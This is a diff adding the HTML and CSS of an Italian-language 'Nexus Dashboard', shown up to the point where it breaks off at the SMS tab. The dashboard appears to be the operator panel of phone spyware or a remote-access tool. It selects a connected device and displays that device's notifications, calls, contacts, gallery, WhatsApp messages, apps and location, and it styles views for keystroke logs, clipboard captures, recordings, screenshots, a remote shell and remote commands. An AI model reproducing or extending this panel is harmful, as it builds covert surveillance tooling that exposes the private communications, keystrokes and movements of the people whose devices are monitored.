@@ -1,0 +1,1872 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Nexus Dashboard</title>
+<style>
+:root {
+  --bg-base: #0a0e1a;
+  --bg-card: #111827;
+  --bg-elevated: #1a2235;
+  --border: #1e2d45;
+  --text-primary: #e2e8f0;
+  --text-secondary: #94a3b8;
+  --accent-blue: #3b82f6;
+  --accent-green: #10b981;
+  --accent-red: #ef4444;
+  --accent-yellow: #f59e0b;
+  --accent-purple: #8b5cf6;
+  --accent-pink: #ec4899;
+  --radius: 12px;
+  --radius-sm: 8px;
+  --nav-height: 110px;
+  --header-height: 56px;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; background: var(--bg-base); color: var(--text-primary); font-family: system-ui, -apple-system, sans-serif; overflow: hidden; }
+
+/* HEADER */
+#header {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+  height: var(--header-height);
+  background: var(--bg-card);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 10px; padding: 0 12px;
+}
+#header h1 { font-size: 18px; font-weight: 700; color: var(--accent-blue); flex: 1; letter-spacing: -0.5px; }
+#header h1 span { color: var(--text-secondary); font-weight: 400; font-size: 13px; margin-left: 6px; }
+#device-picker {
+  background: var(--bg-elevated); border: 1px solid var(--border);
+  color: var(--text-primary); border-radius: var(--radius-sm);
+  padding: 6px 10px; font-size: 13px; max-width: 150px;
+  -webkit-appearance: none; cursor: pointer;
+}
+#btn-refresh {
+  background: var(--bg-elevated); border: 1px solid var(--border);
+  color: var(--text-secondary); border-radius: var(--radius-sm);
+  width: 34px; height: 34px; cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  transition: color .2s, border-color .2s;
+}
+#btn-refresh:hover { color: var(--accent-blue); border-color: var(--accent-blue); }
+#btn-refresh.spin svg { animation: spin .6s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* BOTTOM NAV */
+#bottom-nav {
+  position: fixed; bottom: 0; left: 0; right: 0; z-index: 100;
+  background: var(--bg-card);
+  border-top: 1px solid var(--border);
+  display: grid; grid-template-columns: repeat(6, 1fr);
+  grid-template-rows: 1fr 1fr;
+  height: var(--nav-height);
+}
+.nav-btn {
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  gap: 2px; cursor: pointer; padding: 4px 2px;
+  color: var(--text-secondary); background: none; border: none;
+  transition: color .2s; font-family: inherit;
+  border-top: 2px solid transparent;
+}
+.nav-btn:hover { color: var(--text-primary); }
+.nav-btn.active { color: var(--accent-blue); border-top-color: var(--accent-blue); }
+.nav-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
+.nav-btn span { font-size: 9px; font-weight: 500; line-height: 1; text-align: center; }
+
+/* CONTENT */
+#content {
+  position: fixed;
+  top: var(--header-height);
+  bottom: var(--nav-height);
+  left: 0; right: 0;
+  overflow: hidden;
+}
+.tab-panel {
+  position: absolute; inset: 0;
+  overflow-y: auto; overflow-x: hidden;
+  padding: 12px;
+  visibility: hidden;
+  transform: translateX(100%);
+  transition: transform .25s ease, visibility .25s;
+  -webkit-overflow-scrolling: touch;
+}
+.tab-panel.active {
+  visibility: visible;
+  transform: translateX(0);
+}
+
+/* CARDS */
+.card {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 14px; margin-bottom: 12px;
+}
+.card-title {
+  font-size: 12px; font-weight: 600; color: var(--text-secondary);
+  text-transform: uppercase; letter-spacing: .6px; margin-bottom: 10px;
+}
+.stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
+.stat-card {
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 14px; cursor: pointer;
+  transition: border-color .2s, background .2s;
+}
+.stat-card:hover { border-color: var(--accent-blue); background: var(--bg-elevated); }
+.stat-card .label { font-size: 11px; color: var(--text-secondary); margin-bottom: 6px; }
+.stat-card .value { font-size: 24px; font-weight: 700; line-height: 1; }
+.stat-card .sub { font-size: 11px; color: var(--text-secondary); margin-top: 4px; }
+.stat-blue .value { color: var(--accent-blue); }
+.stat-green .value { color: var(--accent-green); }
+.stat-yellow .value { color: var(--accent-yellow); }
+.stat-red .value { color: var(--accent-red); }
+.stat-purple .value { color: var(--accent-purple); }
+
+/* DEVICE INFO */
+.device-info-row { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
+.device-info-row:last-child { border-bottom: none; }
+.device-info-row .lbl { color: var(--text-secondary); }
+.device-info-row .val { color: var(--text-primary); font-weight: 500; }
+
+/* ONLINE DOT */
+.dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+.dot-green { background: var(--accent-green); box-shadow: 0 0 6px var(--accent-green); }
+.dot-yellow { background: var(--accent-yellow); }
+.dot-red { background: var(--accent-red); }
+
+/* SKELETON */
+.skel { background: linear-gradient(90deg, var(--bg-elevated) 25%, var(--border) 50%, var(--bg-elevated) 75%); background-size: 200% 100%; animation: shimmer 1.4s infinite; border-radius: 6px; }
+@keyframes shimmer { to { background-position: -200% 0; } }
+.skel-line { height: 14px; margin-bottom: 8px; }
+.skel-line.w60 { width: 60%; }
+.skel-line.w40 { width: 40%; }
+.skel-line.w80 { width: 80%; }
+
+/* EVENTS LIST */
+.event-item {
+  display: flex; gap: 10px; padding: 10px 0;
+  border-bottom: 1px solid var(--border); cursor: pointer;
+  transition: background .15s;
+}
+.event-item:last-child { border-bottom: none; }
+.event-icon {
+  width: 36px; height: 36px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0; font-size: 15px;
+}
+.event-body { flex: 1; min-width: 0; }
+.event-app { font-size: 12px; font-weight: 600; color: var(--accent-blue); }
+.event-text { font-size: 13px; color: var(--text-primary); margin-top: 2px; word-break: break-word; }
+.event-time { font-size: 11px; color: var(--text-secondary); margin-top: 3px; }
+.event-title { font-size: 12px; color: var(--text-secondary); font-style: italic; }
+
+/* CALL LOG */
+.call-item { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--border); }
+.call-item:last-child { border-bottom: none; }
+.call-icon { width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.call-in { background: rgba(16,185,129,.15); color: var(--accent-green); }
+.call-out { background: rgba(59,130,246,.15); color: var(--accent-blue); }
+.call-miss { background: rgba(239,68,68,.15); color: var(--accent-red); }
+.call-body { flex: 1; min-width: 0; }
+.call-name { font-size: 14px; font-weight: 600; }
+.call-num { font-size: 12px; color: var(--text-secondary); }
+.call-dur { font-size: 12px; color: var(--text-secondary); text-align: right; }
+
+/* SMS THREADS */
+.thread-item { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid var(--border); cursor: pointer; }
+.thread-item:last-child { border-bottom: none; }
+.thread-avatar { width: 42px; height: 42px; border-radius: 50%; background: var(--bg-elevated); display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; color: var(--accent-blue); border: 1px solid var(--border); }
+.thread-body { flex: 1; min-width: 0; }
+.thread-name { font-size: 14px; font-weight: 600; }
+.thread-preview { font-size: 12px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.thread-time { font-size: 11px; color: var(--text-secondary); }
+.thread-badge { background: var(--accent-blue); color: #fff; font-size: 10px; font-weight: 700; border-radius: 9px; padding: 1px 6px; min-width: 18px; text-align: center; }
+
+/* SMS BUBBLES */
+#sms-thread-view { display: none; }
+#sms-thread-view.active { display: flex; flex-direction: column; height: 100%; }
+#sms-back { display: flex; align-items: center; gap: 8px; padding: 10px 0 14px; cursor: pointer; color: var(--accent-blue); font-size: 14px; font-weight: 600; flex-shrink: 0; }
+.bubble-wrap { display: flex; margin-bottom: 8px; }
+.bubble-wrap.sent { justify-content: flex-end; }
+.bubble-wrap.recv { justify-content: flex-start; }
+.bubble {
+  max-width: 78%; padding: 8px 12px; border-radius: 16px;
+  font-size: 13px; line-height: 1.5; word-break: break-word;
+}
+.bubble-wrap.sent .bubble { background: var(--accent-blue); color: #fff; border-bottom-right-radius: 4px; }
+.bubble-wrap.recv .bubble { background: var(--bg-elevated); color: var(--text-primary); border-bottom-left-radius: 4px; border: 1px solid var(--border); }
+.bubble-time { font-size: 10px; color: var(--text-secondary); margin-top: 3px; text-align: right; }
+.bubble-wrap.recv .bubble-time { text-align: left; }
+
+/* CONTACTS */
+.contact-item { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--border); }
+.contact-item:last-child { border-bottom: none; }
+.contact-avatar { width: 38px; height: 38px; border-radius: 50%; background: var(--bg-elevated); display: flex; align-items: center; justify-content: center; font-size: 16px; color: var(--accent-purple); border: 1px solid var(--border); flex-shrink: 0; }
+.contact-name { font-size: 14px; font-weight: 600; }
+.contact-num { font-size: 12px; color: var(--text-secondary); }
+#contacts-search { width: 100%; background: var(--bg-elevated); border: 1px solid var(--border); color: var(--text-primary); border-radius: var(--radius-sm); padding: 9px 12px; font-size: 13px; margin-bottom: 12px; }
+#contacts-search::placeholder { color: var(--text-secondary); }
+
+/* GALLERY */
+.gallery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 3px; }
+.gallery-thumb {
+  aspect-ratio: 1; background: var(--bg-elevated); border-radius: 4px;
+  overflow: hidden; cursor: pointer; position: relative;
+}
+.gallery-thumb img { width: 100%; height: 100%; object-fit: cover; display: block; transition: transform .2s; }
+.gallery-thumb:hover img { transform: scale(1.05); }
+.gallery-thumb .video-badge { position: absolute; bottom: 4px; right: 4px; background: rgba(0,0,0,.6); color: #fff; font-size: 10px; padding: 1px 5px; border-radius: 4px; }
+.gallery-thumb .size-badge { position: absolute; top: 4px; left: 4px; background: rgba(0,0,0,.6); color: #fff; font-size: 9px; padding: 1px 4px; border-radius: 3px; }
+
+/* LIGHTBOX */
+#lightbox {
+  position: fixed; inset: 0; z-index: 500; background: rgba(0,0,0,.95);
+  display: none; flex-direction: column; align-items: center; justify-content: center;
+  touch-action: none;
+}
+#lightbox.open { display: flex; }
+#lightbox img, #lightbox video { max-width: 100%; max-height: 80vh; object-fit: contain; border-radius: 6px; }
+#lb-close { position: absolute; top: 16px; right: 16px; background: rgba(255,255,255,.1); border: none; color: #fff; width: 40px; height: 40px; border-radius: 50%; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+#lb-caption { position: absolute; bottom: 20px; left: 0; right: 0; text-align: center; font-size: 12px; color: var(--text-secondary); padding: 0 16px; }
+#lb-prev, #lb-next { position: absolute; top: 50%; transform: translateY(-50%); background: rgba(255,255,255,.1); border: none; color: #fff; width: 44px; height: 44px; border-radius: 50%; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+#lb-prev { left: 10px; }
+#lb-next { right: 10px; }
+
+/* BROWSER */
+.browser-item { padding: 10px 0; border-bottom: 1px solid var(--border); cursor: pointer; }
+.browser-item:last-child { border-bottom: none; }
+.browser-url { font-size: 13px; color: var(--accent-blue); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.browser-title { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
+.browser-time { font-size: 11px; color: var(--text-secondary); margin-top: 2px; }
+
+/* KEYLOG */
+.keylog-item { padding: 10px; background: var(--bg-elevated); border-radius: var(--radius-sm); margin-bottom: 8px; border: 1px solid var(--border); }
+.keylog-app { font-size: 11px; color: var(--accent-yellow); font-weight: 600; margin-bottom: 4px; }
+.keylog-text { font-size: 13px; color: var(--text-primary); word-break: break-all; font-family: monospace; }
+.keylog-time { font-size: 11px; color: var(--text-secondary); margin-top: 4px; }
+
+/* CLIPBOARD */
+.clip-item { padding: 10px; background: var(--bg-elevated); border-radius: var(--radius-sm); margin-bottom: 8px; border: 1px solid var(--border); cursor: pointer; }
+.clip-text { font-size: 13px; color: var(--text-primary); word-break: break-word; }
+.clip-time { font-size: 11px; color: var(--text-secondary); margin-top: 4px; }
+.clip-item:hover { border-color: var(--accent-blue); }
+
+/* APPS */
+.app-item { display: flex; align-items: center; gap: 12px; padding: 9px 0; border-bottom: 1px solid var(--border); }
+.app-item:last-child { border-bottom: none; }
+.app-icon { width: 36px; height: 36px; border-radius: 8px; background: var(--bg-elevated); display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; }
+.app-name { font-size: 14px; font-weight: 500; }
+.app-pkg { font-size: 11px; color: var(--text-secondary); font-family: monospace; }
+.app-ver { font-size: 11px; color: var(--text-secondary); }
+
+/* SHELL */
+.shell-output-item { background: #0d1117; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 10px; margin-bottom: 10px; }
+.shell-cmd { font-size: 12px; color: var(--accent-green); font-family: monospace; margin-bottom: 6px; }
+.shell-cmd::before { content: '$ '; color: var(--text-secondary); }
+.shell-out { font-size: 12px; color: var(--text-primary); font-family: monospace; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow-y: auto; }
+.shell-time { font-size: 10px; color: var(--text-secondary); margin-top: 6px; }
+#shell-input-row { display: flex; gap: 8px; margin-bottom: 12px; }
+#shell-input { flex: 1; background: #0d1117; border: 1px solid var(--border); color: var(--accent-green); border-radius: var(--radius-sm); padding: 9px 12px; font-size: 13px; font-family: monospace; }
+#shell-input::placeholder { color: var(--text-secondary); }
+#shell-send { background: var(--accent-blue); color: #fff; border: none; border-radius: var(--radius-sm); padding: 9px 16px; font-size: 13px; font-weight: 600; cursor: pointer; }
+
+/* BATTERY CHART */
+#battery-chart-svg { width: 100%; height: 180px; }
+.batt-entries { margin-top: 10px; max-height: 200px; overflow-y: auto; }
+.batt-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
+.batt-row:last-child { border-bottom: none; }
+.batt-level { font-weight: 700; color: var(--accent-green); }
+.batt-charging { color: var(--accent-yellow); }
+
+/* SCREENSHOTS / AUDIO */
+.file-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+.file-card { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: var(--radius-sm); overflow: hidden; cursor: pointer; transition: border-color .2s; }
+.file-card:hover { border-color: var(--accent-blue); }
+.file-card img { width: 100%; aspect-ratio: 16/9; object-fit: cover; display: block; }
+.file-card-info { padding: 8px; }
+.file-card-name { font-size: 11px; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.file-card-size { font-size: 10px; color: var(--text-secondary); margin-top: 2px; }
+.audio-card { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 12px; margin-bottom: 8px; }
+.audio-card audio { width: 100%; margin-top: 8px; }
+.audio-name { font-size: 13px; font-weight: 600; }
+.audio-meta { font-size: 11px; color: var(--text-secondary); margin-top: 3px; }
+
+/* COMMANDS */
+.cmd-btn {
+  display: flex; align-items: center; gap: 10px;
+  background: var(--bg-elevated); border: 1px solid var(--border);
+  color: var(--text-primary); border-radius: var(--radius);
+  padding: 13px 16px; width: 100%; margin-bottom: 8px;
+  cursor: pointer; font-size: 14px; font-weight: 500; font-family: inherit;
+  transition: border-color .2s, background .2s;
+}
+.cmd-btn:hover { border-color: var(--accent-blue); background: var(--bg-card); }
+.cmd-btn svg { flex-shrink: 0; }
+.cmd-btn .cmd-desc { font-size: 11px; color: var(--text-secondary); margin-left: auto; }
+.cmd-log { background: #0d1117; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 12px; margin-top: 8px; max-height: 200px; overflow-y: auto; }
+.cmd-log-item { font-size: 12px; color: var(--text-secondary); padding: 4px 0; border-bottom: 1px solid rgba(30,45,69,.5); font-family: monospace; }
+.cmd-log-item.ok { color: var(--accent-green); }
+.cmd-log-item.err { color: var(--accent-red); }
+
+/* AI CHAT */
+#ai-chat-messages { flex: 1; overflow-y: auto; padding-bottom: 8px; }
+.ai-msg { margin-bottom: 12px; }
+.ai-msg.user .bubble { background: var(--accent-blue); color: #fff; margin-left: auto; }
+.ai-msg.bot .bubble { background: var(--bg-elevated); color: var(--text-primary); border: 1px solid var(--border); }
+.ai-briefing { background: var(--bg-elevated); border: 1px solid var(--accent-purple); border-radius: var(--radius); padding: 14px; margin-bottom: 12px; font-size: 13px; line-height: 1.6; color: var(--text-primary); }
+.ai-briefing-label { font-size: 11px; color: var(--accent-purple); font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: .5px; }
+#ai-input-row { display: flex; gap: 8px; flex-shrink: 0; }
+#ai-input { flex: 1; background: var(--bg-elevated); border: 1px solid var(--border); color: var(--text-primary); border-radius: 20px; padding: 9px 14px; font-size: 13px; font-family: inherit; }
+#ai-input::placeholder { color: var(--text-secondary); }
+#ai-send { background: var(--accent-purple); color: #fff; border: none; border-radius: 50%; width: 38px; height: 38px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+#tab-ai { display: flex; flex-direction: column; }
+
+/* TOAST */
+#toast-container { position: fixed; bottom: calc(var(--nav-height) + 10px); left: 12px; right: 12px; z-index: 999; pointer-events: none; display: flex; flex-direction: column; gap: 6px; }
+.toast {
+  background: var(--bg-elevated); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 10px 14px;
+  font-size: 13px; color: var(--text-primary);
+  animation: slideUp .3s ease, fadeOut .4s ease 2.6s forwards;
+  pointer-events: auto;
+}
+.toast.success { border-color: var(--accent-green); }
+.toast.error { border-color: var(--accent-red); }
+.toast.info { border-color: var(--accent-blue); }
+@keyframes slideUp { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }
+@keyframes fadeOut { from { opacity:1; } to { opacity:0; } }
+
+/* EMPTY STATE */
+.empty { text-align: center; padding: 40px 20px; color: var(--text-secondary); }
+.empty svg { width: 48px; height: 48px; margin-bottom: 12px; opacity: .4; }
+.empty p { font-size: 14px; }
+
+/* SEARCH BAR */
+.search-bar { width: 100%; background: var(--bg-elevated); border: 1px solid var(--border); color: var(--text-primary); border-radius: var(--radius-sm); padding: 9px 12px; font-size: 13px; margin-bottom: 12px; font-family: inherit; }
+.search-bar::placeholder { color: var(--text-secondary); }
+
+/* BADGE */
+.badge { display: inline-flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; padding: 1px 6px; border-radius: 8px; }
+.badge-blue { background: rgba(59,130,246,.2); color: var(--accent-blue); }
+.badge-green { background: rgba(16,185,129,.2); color: var(--accent-green); }
+.badge-red { background: rgba(239,68,68,.2); color: var(--accent-red); }
+.badge-yellow { background: rgba(245,158,11,.2); color: var(--accent-yellow); }
+
+/* LOAD MORE */
+.load-more { width: 100%; background: var(--bg-elevated); border: 1px solid var(--border); color: var(--text-secondary); border-radius: var(--radius-sm); padding: 10px; font-size: 13px; cursor: pointer; margin-top: 8px; font-family: inherit; }
+.load-more:hover { border-color: var(--accent-blue); color: var(--text-primary); }
+
+/* WHATSAPP */
+.wa-item { display: flex; gap: 10px; padding: 10px 0; border-bottom: 1px solid var(--border); }
+.wa-item:last-child { border-bottom: none; }
+.wa-avatar { width: 36px; height: 36px; border-radius: 50%; background: rgba(37,211,102,.15); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.wa-body { flex: 1; min-width: 0; }
+.wa-sender { font-size: 12px; font-weight: 600; color: #25d366; }
+.wa-text { font-size: 13px; color: var(--text-primary); margin-top: 2px; word-break: break-word; }
+.wa-time { font-size: 11px; color: var(--text-secondary); margin-top: 3px; }
+
+/* SCROLLBAR */
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+/* WS STATUS */
+#ws-status { width: 8px; height: 8px; border-radius: 50%; background: var(--accent-red); flex-shrink: 0; }
+#ws-status.connected { background: var(--accent-green); box-shadow: 0 0 6px var(--accent-green); }
+
+/* SECTION HEADER */
+.section-hdr { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; }
+.section-hdr h2 { font-size: 14px; font-weight: 700; color: var(--text-primary); }
+.section-hdr .count { font-size: 12px; color: var(--text-secondary); }
+
+/* SVG BAR CHART */
+.chart-bar { transition: opacity .2s; cursor: pointer; }
+.chart-bar:hover { opacity: .8; }
+.chart-label { font-size: 9px; fill: var(--text-secondary); }
+.chart-value { font-size: 9px; fill: var(--text-primary); }
+
+/* DONUT */
+.donut-text { font-size: 18px; font-weight: 700; fill: var(--text-primary); }
+.donut-sub { font-size: 11px; fill: var(--text-secondary); }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div id="header">
+  <h1>⬡ Nexus <span id="header-sub">Dashboard</span></h1>
+  <div id="ws-status" title="WebSocket"></div>
+  <select id="device-picker"><option value="">— dispositivo —</option></select>
+  <button id="btn-refresh" title="Aggiorna">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+  </button>
+</div>
+
+<!-- BOTTOM NAV -->
+<nav id="bottom-nav">
+  <!-- ROW 1 -->
+  <button class="nav-btn active" data-tab="home">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+    <span>Home</span>
+  </button>
+  <button class="nav-btn" data-tab="activity">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+    <span>Attività</span>
+  </button>
+  <button class="nav-btn" data-tab="calls">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.18h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.18 6.18l1.79-1.79a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+    <span>Chiamate</span>
+  </button>
+  <button class="nav-btn" data-tab="sms">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    <span>SMS</span>
+  </button>
+  <button class="nav-btn" data-tab="contacts">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+    <span>Contatti</span>
+  </button>
+  <button class="nav-btn" data-tab="gallery">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+    <span>Galleria</span>
+  </button>
+  <button class="nav-btn" data-tab="whatsapp">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
+    <span>WhatsApp</span>
+  </button>
+  <button class="nav-btn" data-tab="apps">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+    <span>App</span>
+  </button>
+  <button class="nav-btn" data-tab="location">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="11" r="3"/><path d="M17.657 16.657L13.414 20.9a2 2 0 0 1-2.827 0l-4.244-4.243a8 8 0 1 1 11.314 0z"/></svg>
+    <span>Posizione</span>
+  </button>
+  <button class="nav-btn" data-tab="battery">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="18" height="11" rx="2"/><path d="M22 11v3"/><line x1="6" y1="12" x2="12" y2="12"/><polyline points="9 9 12 12 9 15"/></svg>
+    <span>Batteria</span>
+  </button>
+  <button class="nav-btn" data-tab="commands">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93l-1.41 1.41M5.34 18.66l-1.41 1.41M3 12H1m22 0h-2M5.34 5.34L3.93 3.93M20.07 20.07l-1.41-1.41M12 3V1m0 22v-2"/></svg>
+    <span>Comandi</span>
+  </button>
+</nav>
+
+<!-- CONTENT PANELS -->
+<div id="content">
+
+  <!-- HOME -->
+  <div id="tab-home" class="tab-panel active">
+    <div id="home-device-banner" class="card" style="display:none">
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+        <div id="home-device-icon" style="font-size:28px">📱</div>
+        <div>
+          <div id="home-device-name" style="font-size:16px;font-weight:700"></div>
+          <div id="home-device-model" style="font-size:12px;color:var(--text-secondary)"></div>
+        </div>
+        <div style="margin-left:auto;text-align:right">
+          <div id="home-device-status" style="font-size:12px"></div>
+          <div id="home-device-battery" style="font-size:12px;color:var(--accent-yellow)"></div>
+        </div>
+      </div>
+      <div id="home-device-details"></div>
+    </div>
+
+    <div id="home-no-device" class="empty">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+      <p>Seleziona un dispositivo dall'alto</p>
+    </div>
+
+    <div id="home-stats" style="display:none">
+      <div class="stat-grid">
+        <div class="stat-card stat-blue" onclick="switchTab('activity')">
+          <div class="label">📢 Notifiche</div>
+          <div class="value" id="stat-events">—</div>
+          <div class="sub">ultimi eventi</div>
+        </div>
+        <div class="stat-card stat-green" onclick="switchTab('calls')">
+          <div class="label">📞 Chiamate</div>
+          <div class="value" id="stat-calls">—</div>
+          <div class="sub">nel log</div>
+        </div>
+        <div class="stat-card stat-yellow" onclick="switchTab('sms')">
+          <div class="label">💬 SMS</div>
+          <div class="value" id="stat-sms">—</div>
+          <div class="sub">messaggi</div>
+        </div>
+        <div class="stat-card stat-purple" onclick="switchTab('contacts')">
+          <div class="label">👤 Contatti</div>
+          <div class="value" id="stat-contacts">—</div>
+          <div class="sub">in rubrica</div>
+        </div>
+        <div class="stat-card stat-red" onclick="switchTab('apps')">
+          <div class="label">📦 App</div>
+          <div class="value" id="stat-apps">—</div>
+          <div class="sub">installate</div>
+        </div>
+        <div class="stat-card stat-blue" onclick="switchTab('gallery')">
+          <div class="label">🖼️ Media</div>
+          <div class="value" id="stat-media">—</div>
+          <div class="sub">file</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">📊 Attività ultime 24h</div>
+        <svg id="home-bar-chart" viewBox="0 0 300 80" width="100%" height="80">
+          <text x="150" y="40" text-anchor="middle" fill="var(--text-secondary)" font-size="11">Caricamento...</text>
+        </svg>
+      </div>
+
+      <div class="card">
+        <div class="section-hdr">
+          <h2>🔔 Ultimi eventi</h2>
+          <span class="count" onclick="switchTab('activity')" style="cursor:pointer;color:var(--accent-blue)">Vedi tutti →</span>
+        </div>
+        <div id="home-recent-events"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ACTIVITY -->
+  <div id="tab-activity" class="tab-panel">
+    <div class="section-hdr">
+      <h2>🔔 Notifiche & Eventi</h2>
+      <span class="count" id="activity-count"></span>
+    </div>
+    <input class="search-bar" id="activity-search" placeholder="Cerca eventi..." oninput="filterActivity()">
+    <div id="activity-list"></div>
+    <button class="load-more" id="activity-loadmore" onclick="loadMoreActivity()" style="display:none">Carica altri...</button>
+  </div>
+
+  <!-- CALLS -->
+  <div id="tab-calls" class="tab-panel">
+    <div class="section-hdr">
+      <h2>📞 Registro Chiamate</h2>
+      <span class="count" id="calls-count"></span>
+    </div>
+    <input class="search-bar" id="calls-search" placeholder="Cerca numero o nome..." oninput="filterCalls()">
+    <div class="card" id="calls-stats-row" style="margin-bottom:10px">
+      <div style="display:flex;gap:16px;justify-content:space-around;text-align:center">
+        <div><div id="cs-in" style="font-size:20px;font-weight:700;color:var(--accent-green)">0</div><div style="font-size:11px;color:var(--text-secondary)">In entrata</div></div>
+        <div><div id="cs-out" style="font-size:20px;font-weight:700;color:var(--accent-blue)">0</div><div style="font-size:11px;color:var(--text-secondary)">In uscita</div></div>
+        <div><div id="cs-miss" style="font-size:20px;font-weight:700;color:var(--accent-red)">0</div><div style="font-size:11px;color:var(--text-secondary)">Perse</div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div id="calls-list"></div>
+    </div>
+  </div>
+
+  <!-- SMS -->
